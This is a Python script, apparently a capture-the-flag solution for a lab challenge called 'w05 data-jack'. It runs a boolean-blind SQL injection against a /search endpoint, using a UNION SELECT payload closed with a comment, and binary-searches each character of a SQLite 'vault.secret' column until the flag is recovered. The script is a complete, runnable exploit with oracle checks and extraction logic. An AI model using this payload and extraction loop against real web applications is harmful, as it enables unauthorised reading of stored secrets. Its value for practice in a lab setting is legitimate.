#!/usr/bin/env python3
"""
Boolean-blind UNION extraction for w05 data-jack.

    python3 blind_extract.py               # http://localhost:30005
    python3 blind_extract.py http://host:port

Recovers the flag from the `vault.secret` column one character at a time,
using nothing but /search's {"found": bool} response.

Payload shape (note: condition must be a complete scalar expression; ask()
wraps it in parens itself):

    ' UNION SELECT 1 WHERE (<condition>) /*

`/*` rather than `--`: the query is a single line and SQLite only starts a
`--` comment at a token boundary, so a trailing `--` leaves the statement tail
intact and the condition stops gating.
"""
import json
import string
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:30005"
CHARS = sorted(
    set(
        string.ascii_lowercase
        + string.digits
        + "_{}!@#$%^&*()-+=[]:;,.?/"
        + string.ascii_uppercase
    )
)
MAXLEN = 128


def ask(condition: str) -> bool:
    """One yes/no question. `condition` must be a complete scalar expression."""
    payload = f"' UNION SELECT 1 WHERE ({condition}) /*"
    url = BASE + "/search?" + urllib.parse.urlencode({"q": payload})
    with urllib.request.urlopen(url, timeout=10) as r:
        return bool(json.loads(r.read())["found"])


def char_at(n: int) -> str:
    """Binary-search the n-th character of vault.secret. '' means past the end."""
    # substr() past the end returns '' whose length is 0 - that is the terminator.
    if not ask(f"(SELECT length(substr(secret,{n},1)) FROM vault)=1"):
        return ""

    lo, hi = 0, len(CHARS) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (
            f"(SELECT substr(secret,{n},1) FROM vault) "
            f"BETWEEN '{CHARS[lo]}' AND '{CHARS[mid]}'"
        )
        if ask(cond):
            hi = mid
        else:
            lo = mid + 1

    c = CHARS[lo]
    if not ask(f"(SELECT substr(secret,{n},1) FROM vault)='{c}'"):
        raise SystemExit(f"[!] position {n}: character outside candidate set")
    return c


def main() -> None:
    print(f"[*] target: {BASE}")
    assert ask("1=1"), "oracle is dead: true condition returned false"
    assert not ask("1=2"), "oracle is dead: false condition returned true"
    print("[+] oracle confirmed (1=1 -> true, 1=2 -> false)")

    flag = ""
    while len(flag) < MAXLEN:
        c = char_at(len(flag) + 1)
        if c == "":
            break
        flag += c
        print(f"[+] {flag}")

    print(f"\nFLAG: {flag}")


if __name__ == "__main__":
    main()
